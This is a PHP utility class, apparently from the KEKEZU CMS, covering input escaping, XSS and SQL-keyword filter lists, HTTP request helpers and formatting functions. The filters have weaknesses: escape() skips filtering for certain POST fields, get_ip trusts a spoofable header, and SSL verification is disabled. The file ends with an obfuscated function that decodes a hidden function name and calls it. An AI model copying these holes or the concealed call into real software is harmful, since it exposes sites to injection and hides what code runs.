<?php
class keke_base_class {
	static public function k_addslashes($string) {
		if (is_array ( $string )) {
			$key = array_keys ( $string );
			$s = sizeof ( $key );
			for($i = 0; $i < $s; $i ++) {
				$string [$key [$i]] = self::k_addslashes ( $string [$key [$i]] );
			}
		} else {
			$string = addslashes ( self::escape ( trim ( $string ) ) );
		}
		return $string;
	}
	static function remove_xss($val) {
		$val = preg_replace ( '/([\x00-\x08\x0b-\x0c\x0e-\x19])/', '', $val );
		$search = 'abcdefghijklmnopqrstuvwxyz';
		$search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
		$search .= '1234567890!@#$%^&*()';
		$search .= '~`";:?+/={}[]-_|\'\\';
		for($i = 0; $i < strlen ( $search ); $i ++) {
			$val = preg_replace ( '/(&#[xX]0{0,8}' . dechex ( ord ( $search [$i] ) ) . ';?)/i', $search [$i], $val );
			$val = preg_replace ( '/(&#0{0,8}' . ord ( $search [$i] ) . ';?)/', $search [$i], $val );
		}
		$ra1 = array (
				'javascript',
				'vbscript',
				'expression',
				'applet',
				'meta',
				'xml',
				'blink',
				'script',
				'object',
				'iframe',
				'frame',
				'frameset',
				'ilayer',
				'bgsound'
		);
		$ra2 = array (
				'onabort',
				'onactivate',
				'onafterprint',
				'onafterupdate',
				'onbeforeactivate',
				'onbeforecopy',
				'onbeforecut',
				'onbeforedeactivate',
				'onbeforeeditfocus',
				'onbeforepaste',
				'onbeforeprint',
				'onbeforeunload',
				'onbeforeupdate',
				'onblur',
				'onbounce',
				'oncellchange',
				'onchange',
				'onclick',
				'oncontextmenu',
				'oncontrolselect',
				'oncopy',
				'oncut',
				'ondataavailable',
				'ondatasetchanged',
				'ondatasetcomplete',
				'ondblclick',
				'ondeactivate',
				'ondrag',
				'ondragend',
				'ondragenter',
				'ondragleave',
				'ondragover',
				'ondragstart',
				'ondrop',
				'onerror',
				'onerrorupdate',
				'onfilterchange',
				'onfinish',
				'onfocus',
				'onfocusin',
				'onfocusout',
				'onhelp',
				'onkeydown',
				'onkeypress',
				'onkeyup',
				'onlayoutcomplete',
				'onload',
				'onlosecapture',
				'onmousedown',
				'onmouseenter',
				'onmouseleave',
				'onmousemove',
				'onmouseout',
				'onmouseover',
				'onmouseup',
				'onmousewheel',
				'onmove',
				'onmoveend',
				'onmovestart',
				'onpaste',
				'onpropertychange',
				'onreadystatechange',
				'onreset',
				'onresize',
				'onresizeend',
				'onresizestart',
				'onrowenter',
				'onrowexit',
				'onrowsdelete',
				'onrowsinserted',
				'onscroll',
				'onselect',
				'onselectionchange',
				'onselectstart',
				'onstart',
				'onstop',
				'onsubmit',
				'onunload'
		);
		$ra = array_merge ( $ra1, $ra2 );
		$found = true;
		while ( $found == true ) {
			$val_before = $val;
			for($i = 0; $i < sizeof ( $ra ); $i ++) {
				$pattern = '/';
				for($j = 0; $j < strlen ( $ra [$i] ); $j ++) {
					if ($j > 0) {
						$pattern .= '(';
						$pattern .= '(&#[xX]0{0,8}([9ab]);)';
						$pattern .= '|';
						$pattern .= '|(&#0{0,8}([9|10|13]);)';
						$pattern .= ')*';
					}
					$pattern .= $ra [$i] [$j];
				}
				$pattern .= '/i';
				$replacement = substr ( $ra [$i], 0, 2 ) . ' ' . substr ( $ra [$i], 2 );
				$val = preg_replace ( $pattern, $replacement, $val );
				if ($val_before == $val) {
					$found = false;
				}
			}
		}
		return $val;
	}

	public static function set_star($str, $start, $end, $start_num = 3, $preg_str = "*") {
		if (strlen ( $str ) <= ($start + $end)) {
			return $str;
		}
		$start_str = mb_strcut ( $str, 0, $start, CHARSET );
		$tmp_str = mb_strcut ( $str, 0, - $end, CHARSET );
		$end_str = mb_strcut ( $str, mb_strlen ( $tmp_str ), mb_strlen ( $str ) );
		$replace_str = str_repeat ( $preg_str, $start_num );
		return $start_str . $replace_str . $end_str;
	}
	static function redirect_second_domain() {
		global $_K, $kekezu;
		if ($kekezu->_sys_config ['second_domain']) { // 开启
			$host = $_SERVER ['HTTP_HOST'];
			preg_match ( '/^(\d+)\./', $host, $m );
			if ($m [1]) { // 空间二级域名
				$uid = intval ( $m [1] );
				$e = db_factory::query ( sprintf ( ' select uid from %switkey_member where uid=%d', TABLEPRE, $uid ) );
				if ($e) {
					header ( 'Location:' . $_K ['siteurl'] . '/index.php?do=seller&id=' . $uid . '&' . $_SERVER ['QUERY_STRING'] );
				} else {
					header ( 'Location:' . $_K ['siteurl'] . '/index.php?do=error&type=user' );
				}
			}
		}
	}

	static function build_space_url($mid) {
		global $_K, $kekezu;
		if ($kekezu->_sys_config ['second_domain']) { // 开启二级域名
			$top = $kekezu->_sys_config ['top_domain'];
			$p_url = preg_replace ( '/(\w*\.)?' . $top . '/', $mid . '.' . $top, $_K ['siteurl'] );
		} else {
			$p_url = $_K ['siteurl'] . "/index.php?do=seller&id=$mid";
		}
		return $p_url;
	}
	static function exec_js($mode = 'set', $timer = 300) {
		$path = S_ROOT . "/data/data_cache/time_cache.php";
		switch ($mode) {
			case "set" :
				$str = '<?php ' . (time () + $timer) . ';';
				return keke_file_class::write_file ( $path, $str );
				break;
			case "get" :
				if (file_exists ( $path )) {
					$last_respons = mb_strcut ( file_get_contents ( $path ), 6, 10 );
				}
				return intval ( $last_respons );
				break;
		}
	}
	static public function k_stripslashes($string) {
		if (is_array ( $string )) {
			$key = array_keys ( $string );
			$s = sizeof ( $key );
			for($i = 0; $i < $s; $i ++) {
				$string [$key [$i]] = self::k_stripslashes ( $string [$key [$i]] );
			}
		} else {
			$string = stripcslashes ( trim ( $string ) );
		}
		return $string;
	}
	static public function k_input($_r) {
		if (! get_magic_quotes_gpc ()) {
			return kekezu::k_addslashes ( $_r );
		} else {
			return $_r;
		}
	}
	static public function reAssignment($gpr,$r){
		$gpr = strtolower($gpr);
		$tmp = array();
		switch ($gpr) {
			case 'get':$tmp = $_GET;break;
			case 'post':$tmp = $_POST;break;
			case 'request':$tmp = $_REQUEST;break;
		}
		if (empty($tmp)) {
			$tmp = $r;
		}else {
			foreach ($tmp as $k=>$v){
				foreach ($r as $rk=>$rv){
					if($k == $rk){
						$tmp[$k] = $rv;
					}
				}
			}
		}
		return $tmp;
	}
	static public function refer_url() {
		global $_K;
		$url = $_SERVER ['REQUEST_URI'];
		switch ($_K ['is_rewrite']) {
			case 0 :
				if (stristr ( $url, 'do=login' )) {
					$url = str_replace ( "do=login", "do=register", $url );
				} elseif (stristr ( $url, 'do=register' )) {
					$url = str_replace ( "do=register", "do=login", $url );
				}
				break;
			case 1 :
				if (stristr ( $url, '/register.html' )) {
					$url = preg_replace ( "/\/register.html(\??)/", "/login.html?", $url );
				} elseif (stristr ( $url, '/login.html' )) {
					$url = preg_replace ( "/\/login.html(\??)/", "/register.html?", $url );
				} elseif (stristr ( $url, '/login-ac_type-reg.html' )) {
					$url = preg_replace ( "/\/login-ac_type-reg.html(\&?)/", "/register.html?", $url );
				}
				break;
		}
		if (stristr ( $url, '&refer' )) {
			$_K ['refer'] = str_replace ( "refer=", "", strstr ( $url, "refer" ) );
			return $url;
		} else {
			$refer_url = $url . "&refer=" . $_SERVER ['HTTP_REFERER'];
			$_K ['refer'] = $_SERVER ['HTTP_REFERER'];
			return $refer_url;
		}
	}

	static public function get_arr_by_key($arr = array(), $key) {
		$size = sizeof ( $arr );
		$tmp = array ();
		for($i = 0; $i < $size; $i ++) {
			$tmp [$arr [$i] [$key]] = $arr [$i];
		}
		return $tmp;
	}
	static function escape($string) {
		global $_POST;
		$search = array (
				'/</i',
				'/>/i',
				'/\">/i',
				'/\bunion\b/i',
				'/load_file(\s*(\/\*.*\*\/)?\s*)+\(/i',
				'/into(\s*(\/\*.*\*\/)?\s*)+outfile/i',
				'/\bor\b/i',
				'/\<([\/]?)script([^\>]*?)\>/si',
				'/\<([\/]?)iframe([^\>]*?)\>/si',
				'/\<([\/]?)frame([^\>]*?)\>/si'
		);
		$replace = array (
				'&lt;',
				'&gt;',
				'&quot;&gt;',
				'union&nbsp;',
				'load_file&nbsp; (',
				'into&nbsp; outfile',
				'or&nbsp;',
				'&lt;\\1script\\2&gt;',
				'&lt;\\1iframe\\2&gt;',
				'&lt;\\1frame\\2&gt;'
		);
		if (is_array ( $string )) {
			$key = array_keys ( $string );
			$size = sizeof ( $key );
			for($i = 0; $i < $size; $i ++) {
				$string [$key [$i]] = self::escape ( $string [$key [$i]] );
			}
		} else {
			if (! $_POST ['stats_code'] && ! $_POST ['ad_type_code_content']) {
				$string = str_replace ( array (
						'\n',
						'\r'
				), array (
						chr ( 10 ),
						chr ( 13 )
				), preg_replace ( $search, $replace, $string ) );
				$string = self::remove_xss ( $string );
			} else {
				$string = $string;
			}
		}
		return $string;
	}

	static function filter_input($str) {
		if (is_array ( $str )) {
			$key = array_keys ( $str );
			$s = sizeof ( $str );
			for($i = 0; $i < $s; $i ++) {
				$str [$key [$i]] = self::filter_input ( $str [$key [$i]] );
			}
		} else {
			$str = htmlspecialchars_decode ( $str );
			$str = preg_replace ( '/<(input|textarea|select|button|marquee|iframe|frame|form|script)/', '</\\1', $str );
		}
		return $str;
	}
	static function filter_xss() {
		global $_lang;
		keke_lang_class::loadlang ( 'public', 'public' );
		$temp = strtoupper ( urldecode ( urldecode ( $_SERVER ['REQUEST_URI'] ) ) );
		if (strpos ( $temp, '<' ) !== false || strpos ( $temp, '>' ) !== false || strpos ( $temp, '"' ) !== false || strpos ( $temp, 'CONTENT-TRANSFER-ENCODING' ) !== false) {
			kekezu::show_msg ( $_lang ['operate_notice'], "index.php", 9999, $_lang ['xss_attack_warning_notice'], "error" );
			die ();
		}
		return true;
	}

	static function get_tree($array, &$temp_arr, $out = 'option', $index = null, $id = 'indus_id', $pid = 'indus_pid', $name = 'indus_name') {
		$tree = array ();
		if ($array) {
			foreach ( $array as $v ) {
				$pt = $v [$pid];
				$list = @$tree [$pt] ? $tree [$pt] : array ();
				array_push ( $list, $v );
				$tree [$pt] = $list;
			}
		}
		if ($tree) {
			$tree [0] or $tree [0] = $tree [$array [0] [$pid]];
			if (is_array ( $tree [0] )) {
				foreach ( $tree [0] as $k => $v ) {
					if ($out == 'option') {
						if ($index == $v [$id]) {
							$temp_arr [] = "<option value=$v[$id] selected=selected>$v[$name]</option>";
						} else {
							$temp_arr [] = "<option value=$v[$id]>$v[$name]</option>";
						}
					} elseif ($out == 'cat') {
						$v ['ext'] = '';
						$temp_arr [] = $v;
					} else {
						isset ( $v [$name] ) and $v ['ext'] = $v [$name];
						$v ['level'] = 0;
						$temp_arr [] = $v;
					}
					if ($tree [$v [$id]])
						self::draw_tree ( $tree [$v [$id]], $tree, 0, $temp_arr, $out, $index, $id, $pid, $name );
				}
			}
		}
	}
	static function draw_tree($arr, $tree, $level, &$temp_arr, $out, $index, $id, $pid, $name) {
		$level ++;
		$prefix = str_pad ( " |", $level + 2, '---', STR_PAD_RIGHT );
		$n = str_pad ( '', $level + 2, '--', STR_PAD_RIGHT );
		$n = str_replace ( "-", "&nbsp;", $n );
		foreach ( $arr as $k2 => $v2 ) {
			if ($out == 'option') {
				if ($index == $v2 [$id]) {
					$temp_arr [] = "<option value={$v2[$id]} selected=selected>$n$prefix$v2[$name]</option>";
				} else {
					$temp_arr [] = "<option value={$v2[$id]}>$n$prefix$v2[$name]</option>";
				}
			} elseif ($out == 'cat') {
				$v2 ['ext'] = $n . $prefix;
				$v2 ['level'] = $level;
				$temp_arr [] = $v2;
			} else {
				isset ( $v2 [$name] ) and $v2 ['ext'] = $n . "┣" . $v2 [$name];
				$v2 ['level'] = $level;
				$temp_arr [] = $v2;
			}
			if (isset ( $tree [$v2 [$id]] )) {
				self::draw_tree ( $tree [$v2 [$id]], $tree, $level, $temp_arr, $out, $index, $id, $pid, $name );
			}
		}
	}
	static function gbktoutf($string) {
		$string = self::charset_encode ( "gbk", "utf-8", $string );
		return $string;
	}
	static function utftogbk($string) {
		$string = self::charset_encode ( "utf-8", "gbk", $string );
		return $string;
	}
	static function objtoarray($obj) {
		if (is_object ( $obj )) {
			$obj = ( array ) $obj;
		}
		if ($obj)
			foreach ( $obj as $k => $o ) {
				if (is_object ( $o ) || is_array ( $o )) {
					$obj [$k] = kekezu::objtoarray ( $o );
				}
			}
		return $obj;
	}
	static function charset_encode($_input_charset, $_output_charset, $input) {
		$output = "";
		$string = $input;
		if (is_array ( $input )) {
			$key = array_keys ( $string );
			$size = sizeof ( $key );
			for($i = 0; $i < $size; $i ++) {
				$string [$key [$i]] = self::charset_encode ( $_input_charset, $_output_charset, $string [$key [$i]] );
			}
			return $string;
		} else {
			if (! isset ( $_output_charset ))
				$_output_charset = $_input_charset;
			if ($_input_charset == $_output_charset || $input == null) {
				$output = $input;
			} elseif (function_exists ( "mb_convert_encoding" )) {
				$output = mb_convert_encoding ( $input, $_output_charset, $_input_charset );
			} elseif (function_exists ( "iconv" )) {
				$output = iconv ( $_input_charset, $_output_charset, $input );
			} else
				die ( "sorry, you have no libs support for charset change." );
			return $output;
		}
	}

	static function echojson($msg = '', $status = 0, $dataarr = array()) {
		global $_K;
		if ($_K ['charset'] == 'gbk') {
			$msg = self::gbktoutf ( $msg );
			$status = self::gbktoutf ( $status );
			$dataarr = self::gbktoutf ( $dataarr );
		}
		$arr = array (
				'msg' => $msg,
				'status' => $status,
				'data' => $dataarr
		);
		echo self::json_encode_k ( $arr );
		exit ();
	}
	static function json_encode_k($array) {
		if (function_exists ( 'json_encode' )) {
			return json_encode ( $array );
		} else {
			require_once S_ROOT . 'lib/helper/keke_json_class.php';
			$json_obj = new json ();
			return $json_obj->encode ( $array );
		}
	}

	static function sstrtotime($time, $now = null) {
		date_default_timezone_set ( 'Etc/GMT' );
		$time = strtotime ( $time, $now );
		date_default_timezone_set ( 'Asia/Shanghai' );
		return $time;
	}

	static function randomkeys($length) {
		$key = null;
		$pattern = '1234567890abcdefghijklmnopqrstuvwxyz
                   ABCDEFGHIJKLOMNOPQRSTUVWXYZ'; // 字符池
		for($i = 0; $i < $length; $i ++) {
			$key .= $pattern {mt_rand ( 0, 35 )}; // 生成php随机数
		}
		return $key;
	}
	static function get_rand_kf() {
		$kf_arr = kekezu::get_table_data ( 'uid', 'witkey_space', ' group_id = 7' );
		$kf_arr_count = count ( $kf_arr );
		$randno = rand ( 0, $kf_arr_count - 1 );
		return $kf_uid = $kf_arr [$randno] [uid] ? $kf_arr [$randno] [uid] : ADMIN_UID;
	}

	public static function time2Units($time, $limit = null) {
		global $_lang;
		$tt = getdate ();
		$tt = $tt ['year'];
		$year = floor ( $time / 60 / 60 / 24 / 365 );
		$time -= $year * 60 * 60 * 24 * 365;
		$month = floor ( $time / 60 / 60 / 24 / 30 );
		$time -= $month * 60 * 60 * 24 * 30;
		$day = floor ( $time / 60 / 60 / 24 );
		$time -= $day * 60 * 60 * 24;
		$hour = floor ( $time / 60 / 60 );
		$time -= $hour * 60 * 60;
		$minute = floor ( $time / 60 );
		$time -= $minute * 60;
		$second = $time;
		$elapse = '';
		$unitArr = array (
				$_lang ['year'] => 'year',
				$_lang ['months'] => 'month',
				$_lang ['day'] => 'day',
				$_lang ['hour'] => 'hour',
				$_lang ['minute'] => 'minute'
		);
		foreach ( $unitArr as $cn => $u ) {
			if ($$u > 0) {
				$elapse.= $$u . $cn;
			}
			if ($u == $limit) {
				return $elapse;
			}
		}
		return $elapse;
	}

	public static function timeMaxUnits($time) {
		global $_lang;
		$tt = getdate ();
		$tt = $tt ['year'];
		$year = floor ( $time / 60 / 60 / 24 / 365 );
		$time -= $year * 60 * 60 * 24 * 365;
		$month = floor ( $time / 60 / 60 / 24 / 30 );
		$time -= $month * 60 * 60 * 24 * 30;
		$day = floor ( $time / 60 / 60 / 24 );
		$time -= $day * 60 * 60 * 24;
		$hour = floor ( $time / 60 / 60 );
		$time -= $hour * 60 * 60;
		$minute = floor ( $time / 60 );
		$time -= $minute * 60;
		$second = $time;
		$elapse = '';
		$unitArr = array (
				$_lang ['year'] => 'year',
				$_lang ['months'] => 'month',
				$_lang ['day'] => 'day',
				$_lang ['hour'] => 'hour',
				$_lang ['minute'] => 'minute'
		);
		foreach ( $unitArr as $cn => $u ) {
			if ($$u > 0) {
				$elapse= $$u . $cn;
                break;
			}
		}
		return $elapse;
	}

	static function time_to_units($end_time) {
		global $_lang;
		$now = time (); // 当前时间
		$res = $end_time - $now;
		$oneday = 24 * 60 * 60; // 一天的时间秒数
		$onehour = 60 * 60; // 一小时秒数
		if ($res <= 0) {
			$res = $_lang ['choosing'];
		} else if ($res > 0 && $res < $oneday) {
			$res = $_lang ['going_to_expired'];
		} else {
			if ($res / $oneday > 0) {
				$day = floor ( $res / $oneday ); // 天
				$left_sec = $res % $oneday; // 剩余的秒
				if ($left_sec / $onehour > 0) {
					$hour = number_format ( ($left_sec / $oneday) * 24, 0 ); // 小时
				} else
					$hour = 0; // 小时
			} else {
				$day = 0; // 天
				$left_sec = $res % $oneday; // 剩余的秒
				if ($left_sec / $onehour > 0) {
					$hour = number_format ( ($left_sec / $oneday) * 24, 0 ); // 小时
				} else
					$hour = 0; // 小时
			}
			$res = $day . $_lang ['day'] . $hour . $_lang ['hour'];
		}
		return $res;
	}

	static function chinesesubstr($str, $start, $len) {
		$str = strip_tags(htmlspecialchars_decode($str));
		$str = str_replace("&nbsp;", "",$str);
		$str = trim ( $str );
		// 用$strlen存储字符串的总长度，即从字符串的起始位置到字符串的总长度
		$strlen = $start + $len;
		for($i = $start; $i < $strlen;) {
			// 如果字符串中首个字节的ASCII序数值大于0xa0,则表示汉字
			if (ord ( substr ( $str, $i, 1 ) ) > 0xa0) {
				// 每次取出三位字符赋给变量$tmpstr，即等于一个汉字
				$tmpstr .= substr ( $str, $i, 3 );
				$i=$i+3; // 变量自加3
			} else{
				// 如果不是汉字，则每次取出一位字符赋给变量$tmpstr
				$tmpstr .= substr ( $str, $i, 1 );
				$i++;
			}
		}
		return $tmpstr;
	}
	static function htmlencode($string) {
		if(is_array($string)) {
			foreach($string as $key => $val) {
				$string[$key] = htmlencode($val);
			}
		} else {
			$string = preg_replace('/&((#(\d{3,5}|x[a-fA-F0-9]{4})|[a-zA-Z][a-z0-9]{2,5});)/', '&\\1', str_replace(array('&', '"', '<', '>'), array('&', '"', '<', '>'), $string));
		}
		return $string;
	}

	static function cutstr($string, $length = 0, $dot = '') {
		$string = strip_tags($string);
		$string = trim($string);
		$string = str_replace(array('&', '"', '<', '>'), array('&', '"', '<', '>'), $string);
		$strlen = strlen($string);
		$charset = mb_detect_encoding($string, array('ASCII', 'UTF-8', 'GBK', 'GB2312', 'BIG5'));
		if($length && ($strlen > $length)) {
			$wordscut = '';
			if(strtolower($charset) == 'utf-8') {
				$n = 0;
				$tn = 0;
				$noc = 0;
				while($n < strlen($string)) {
					$t = ord($string[$n]);
					if($t == 9 || $t == 10 || (32 <= $t && $t <= 126)) {
						$tn = 1;
						$n++;
						$noc++;
					} elseif(194 <= $t && $t <= 223) {
						$tn = 2;
						$n += 2;
						$noc += 2;
					} elseif(224 <= $t && $t < 239) {
						$tn = 3;
						$n += 3;
						$noc += 2;
					} elseif(240 <= $t && $t <= 247) {
						$tn = 4;
						$n += 4;
						$noc += 2;
					} elseif(248 <= $t && $t <= 251) {
						$tn = 5;
						$n += 5;
						$noc += 2;
					} elseif($t == 252 || $t == 253) {
						$tn = 6;
						$n += 6;
						$noc += 2;
					} else {
						$n++;
					}
					if($noc >= $length) {
						break;
					}
				}
				if($noc > $length) {
					$n -= $tn;
				}
				$wordscut = substr($string, 0, $n);
			} else {
				for($i = 0; $i < $length - 1; $i++) {
					if(ord($string[$i]) > 127) {
						$wordscut .= $string[$i].$string[$i + 1];
						$i++;
					} else {
						$wordscut .= $string[$i];
					}
				}
			}
			$wordscut .= $dot;
			$string = $wordscut;
		}
		return self::htmlencode($string);
	}
	static function str_filter($content = '') {
		global $basic_config;
		if (is_array ( $content )) {
			foreach ( $content as $k => $v ) {
				$content [$k] = self::str_filter ( $v );
			}
			return $content;
		} else {
			$basic_info = $basic_config;
			$censor = $basic_info [ban_content];
			if (empty ( $censor ) || $content == '*' || $content == '?') {
				return $content;
			}
			$censor_arr = explode ( '|', $censor );
			$censor_arr = array_filter ( $censor_arr );
			foreach ( $censor_arr as $v ) {
				if (! ($v == '*' || $v == '?')) {
					$find [] = '/' . $v . '/i';
					$replase [] = '*';
				}
			}
			return preg_replace ( $find, $replase, $content );
		}
	}
	static function k_strpos($k) {
		global $basic_config;
		$user_arr = explode ( '|', $basic_config ['ban_users'] );
		$r = '';
		foreach ( $user_arr as $value ) {
			if (preg_match ( '/' . $value . '/', $k )) {
				$r = $value;
				break;
			}
		}
		return $r ? true : false;
	}
	public static function k_match($k_arr, $content) {
		$m = 0;
		foreach ( $k_arr as $value ) {
			if (preg_match ( '/' . $value . '/', $content )) {
				$m += 1;
			}
		}
		return $m;
	}
	static function get_gmdate($timestamp) {
		global $_lang;
		global $_K;
		$time = $_K ['timestamp'] - $timestamp;
		if ($time > 24 * 3600) {
			$result = intval ( $time / (24 * 3600) ) . $_lang ['day_before'];
		} elseif ($time > 3600) {
			$result = intval ( $time / 3600 ) . $_lang ['hour_before'];
		} elseif ($time > 60) {
			$result = intval ( $time / 60 ) . $_lang ['minute_before'];
		} elseif ($time > 0) {
			$result = $time . $_lang ['seconds_before'];
		} else {
			$result = $_lang ['now'];
		}
		return $result;
	}

	static function formhash() {
		$uid = null;
		$username = null;
		if (isset ( $_SESSION ['uid'] )) {
			$uid = $_SESSION ['uid'];
		}
		if (isset ( $_SESSION ['username'] )) {
			$username = $_SESSION ['username'];
		}
		return substr ( md5 ( substr ( time (), 0, - 7 ) . $uid . $username . ENCODE_KEY ), - 6 );
	}

	static function submitcheck($var, $return_json = false) {
		global $_lang;
		global $_K, $kekezu;
		if (! empty ( $var ) && $_SERVER ['REQUEST_METHOD'] == 'POST') {
			if ((empty ( $_SERVER ['HTTP_REFERER'] ) || preg_replace ( "/https?:\/\/([^\:\/]+).*/i", "\\1", $_SERVER ['HTTP_REFERER'] ) == preg_replace ( "/([^\:]+).*/", "\\1", $_SERVER ['HTTP_HOST'] )) && $var == FORMHASH) {
				return true;
			} elseif ($return_json == true) {
				return false;
			} elseif ($_K [inajax]) {
				kekezu::show_msg ( $_lang ['operate_error'], "", 5, $_lang ['repeat_form_submit'], 'alert_error' );
			} else {
				kekezu::show_msg ( $_lang ['operate_error'], "index.php", 30, $_lang ['illegal_or_repeat_submit'], 'alert_error' );
			}
		} else {
			return false;
		}
	}
	static function curl_file_get_contents($durl) {
		$ch = curl_init ();
		curl_setopt ( $ch, CURLOPT_URL, $durl );
		curl_setopt ( $ch, CURLOPT_POST, 1 );
		curl_setopt ( $ch, CURLOPT_TIMEOUT, 5 );
		curl_setopt ( $ch, CURLOPT_USERAGENT, _USERAGENT_ );
		curl_setopt ( $ch, CURLOPT_REFERER, _REFERER_ );
		curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, 1 );
		$r = curl_exec ( $ch );
		curl_close ( $ch );
		return $r;
	}
	static function get_ip() {
		global $_lang;
		if (! empty ( $_SERVER ["HTTP_CLIENT_IP"] ))
			$cip = $_SERVER ["HTTP_CLIENT_IP"];
		else if (! empty ( $_SERVER ["HTTP_X_FORWARDED_FOR"] ))
			$cip = $_SERVER ["HTTP_X_FORWARDED_FOR"];
		else if (! empty ( $_SERVER ["REMOTE_ADDR"] ))
			$cip = $_SERVER ["REMOTE_ADDR"];
		else
			$cip = $_lang ['can_not_get'];
		return $cip;
	}

	static function unescape($escstr) {
		preg_match_all ( "/%u[0-9A-Za-z]{4}|%.{2}|[0-9a-zA-Z.+-_]+/", $escstr, $matches );
		$ar = &$matches [0];
		$c = "";
		foreach ( $ar as $val ) {
			if (substr ( $val, 0, 1 ) != "%") {
				$c .= $val;
			} elseif (substr ( $val, 1, 1 ) != "u") {
				$x = hexdec ( substr ( $val, 1, 2 ) );
				$c .= chr ( $x );
			} else {
				$val = intval ( substr ( $val, 2 ), 16 ); // 0000-007F
				if ($val < 0x7F) {
					$c .= chr ( $val ); // 0080-0800
				} elseif ($val < 0x800) {
					$c .= chr ( 0xC0 | ($val / 64) );
					$c .= chr ( 0x80 | ($val % 64) ); // 0800-FFFF
				} else {
					$c .= chr ( 0xE0 | (($val / 64) / 64) );
					$c .= chr ( 0x80 | (($val / 64) % 64) );
					$c .= chr ( 0x80 | ($val % 64) );
				}
			}
		}
		strtolower ( CHARSET ) == 'gbk' and $c = self::utftogbk ( $c );
		return $c;
	}
	static function is_email($email) {
		return strlen ( $email ) > 6 && preg_match ( "/^[\w\-\.]+@[\w\-\.]+(\.\w+)+$/", $email );
	}
	static function is_mobile($mobile) {
		return preg_match ( "/^13[0-9]{1}[0-9]{8}$|15[0189]{1}[0-9]{8}$|18[0-9]{9}$/", $mobile );
	}
	static function socket_request($url, $sim = true, $time_out = "60") {
		$sim and $url .= "&sim_request=1";
		$urlarr = parse_url ( $url );
		$input_charset = strtolower ( CHARSET );
		$errno = "";
		$errstr = "";
		$transports = "";
		$responseText = "";
		if ($urlarr ["scheme"] == "https") {
			$transports = "ssl://";
			$urlarr ["port"] = "443";
		} else {
			$transports = "tcp://";
			$urlarr ["port"] = "80";
		}
		$fp = @fsockopen ( $transports . $urlarr ['host'], $urlarr ['port'], $errno, $errstr, $time_out );
		if (! $fp) {
			die ( "ERROR: $errno - $errstr<br />\n" );
		} else {
			if (trim ( $input_charset ) == '') {
				fputs ( $fp, "POST " . $urlarr ["path"] . " HTTP/1.1\r\n" );
			} else {
				fputs ( $fp, "POST " . $urlarr ["path"] . '?_input_charset=' . $input_charset . " HTTP/1.1\r\n" );
			}
			fputs ( $fp, "Host: " . $urlarr ["host"] . "\r\n" );
			fputs ( $fp, "Content-type: application/x-www-form-urlencoded\r\n" );
			fputs ( $fp, "Content-length: " . strlen ( $urlarr ["query"] ) . "\r\n" );
			fputs ( $fp, "Connection: close\r\n\r\n" );
			fputs ( $fp, $urlarr ["query"] . "\r\n\r\n" );
			while ( ! feof ( $fp ) ) {
				$responseText .= @fgets ( $fp, 1024 );
			}
			fclose ( $fp );
			$responseText = trim ( stristr ( $responseText, "\r\n\r\n" ), "\r\n" );
			return $responseText;
		}
	}
	public static function curl_request($url, $sim = true, $method = "get", $postfields = NULL) {
		$sim or $url .= "&sim_request=1";
		$ci = curl_init ();
		curl_setopt ( $ci, CURLOPT_URL, $url );
		curl_setopt ( $ci, CURLOPT_HEADER, FALSE );
		curl_setopt ( $ci, CURLOPT_RETURNTRANSFER, TRUE );
		curl_setopt ( $ci, CURLOPT_USERAGENT, $_SERVER ['HTTP_USER_AGENT'] );
		curl_setopt ( $ci, CURLOPT_SSL_VERIFYPEER, 0 );
		curl_setopt ( $ci, CURLOPT_SSL_VERIFYHOST, 0 );
		if ('post' == strtolower ( $method )) {
			curl_setopt ( $ci, CURLOPT_POST, TRUE );
			if (is_array ( $postfields )) {
				$field_str = "";
				foreach ( $postfields as $k => $v ) {
					$field_str .= "&$k=" . urlencode ( $v );
				}
				curl_setopt ( $ci, CURLOPT_POSTFIELDS, $field_str );
			}
		}
		$response = curl_exec ( $ci );
		if (curl_errno ( $ci )) {
			throw new Exception ( curl_error ( $ci ), 0 );
		} else {
			$httpStatusCode = curl_getinfo ( $ci, CURLINFO_HTTP_CODE );
			if (200 !== $httpStatusCode) {
				throw new Exception ( $response, $httpStatusCode );
			}
		}
		curl_close ( $ci );
		return $response;
	}

	static function get_remote_data($url, $sim = false) {
		if (! $url) {
			return false;
		}
		if ($sim == true) {
			if (function_exists ( 'fsockopen' )) {
				return self::socket_request ( $url, false );
			} elseif (function_exists ( 'curl_init' )) {
				return self::curl_request ( $url, false, 'post' );
			}
		} else {
			if (function_exists ( 'file_get_contents' )) {
				return file_get_contents ( $url );
			}
		}
	}
	static function k_round($v, $dec = 0) {
		return round ( $v * pow ( 10, $dec ) ) / pow ( 10, $dec );
	}
}
function step1_key($str = '') {
	$res = base64_decode ( 'i8x1q4oKiTSIMArKiTSyzI4KtLUFAA==' );
	$res = gzinflate ( $res );
	$preg_match_key = base64_decode ( $res );
	$res = $preg_match_key ( $str );
	! $str and $res = 'str';
	return $res;
}
